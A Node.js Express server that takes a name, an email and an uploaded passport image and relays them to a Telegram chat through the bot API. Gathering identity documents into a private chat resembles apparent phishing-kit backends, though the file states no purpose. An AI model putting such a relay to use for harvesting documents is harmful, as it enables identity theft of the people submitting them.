const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const multer = require ('multer');
const FormData = require('form-data');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000; 

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from React/Vue/HTML frontend if you have one
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/data', (req, res) => {
    res.json({ message: 'Hello from Render server!' });
});

// Minimal multer configuration - just for file storage
const upload = multer({
    dest: 'uploads/', });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        return { success: true, data: response.data };
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return { success: false, error: error.response?.data || error.message };
    }
}

// Function to send image to Telegram
async function sendImageToTelegram(imagePath, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', fs.createReadStream(imagePath));
        if (caption) {
            formData.append('caption', caption);
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            formData,
            {
                headers: {
                    ...formData.getHeaders(),
                },
            }
        );

        return { success: true, data: response.data };
    } catch (error) {
        console.error('Error sending image to Telegram:', error.response?.data || error.message);
        return { success: false, error: error.response?.data || error.message };
    }
}

// Route to handle form submission
app.post('/api/data', upload.single('passport'), async (req, res) => {
    try {
        const { name, email } = req.body;
        const passportImage = req.file;
        
        // Validate required fields
        if (!name || !email) {
            return res.status(400).json({
                error: 'All fields are required'
            });
        }
        
        // Format message for Telegram
        const telegramMessage = `
📧 <b>New Form Submission</b>

👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
📁 <b>Passport:</b> ${passportImage ? '✅ Attached' : '❌ Not provided'}

⏰ <i>Received at: ${new Date().toLocaleString()}</i>
        `.trim();
        
        // Send text message to Telegram
        const textResult = await sendToTelegram(telegramMessage);
        
        if (!textResult.success) {
            return res.status(500).json({
                error: 'Failed to send message to Telegram',
                details: textResult.error
            });
        }

        // Send passport image if provided
        if (passportImage) {
            // Validate the image before sending
            if (!fs.existsSync(passportImage.path)) {
                return res.status(400).json({
                    error: 'Uploaded passport image not found'
                });
            }

            if (passportImage.size === 0) {
                return res.status(400).json({
                    error: 'Uploaded passport image is empty'
                });
            }

            const imageCaption = `🛂 Passport for ${name}`;
            const imageResult = await sendImageToTelegram(passportImage.path, imageCaption);
            
            // Clean up uploaded file
            fs.unlinkSync(passportImage.path);
            
            if (!imageResult.success) {
                console.warn('Text sent but image failed to send');
                // Don't return error here - text was sent successfully
            }
        }

        res.json({
            success: true,
            message: 'Form data and passport sent to Telegram successfully'
        });

    } catch (error) {
        console.error('Server error:', error);
        
        // Clean up file if it exists
        if (req.file && fs.existsSync(req.file.path)) {
            fs.unlinkSync(req.file.path);
        }
        
        res.status(500).json({
            error: 'Internal server error',
            details: error.message
        });
    }
});

// Health check route
app.get('/', (req, res) => {
    res.json({ message: 'Telegram Bot Server is running!' });
});

  
// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

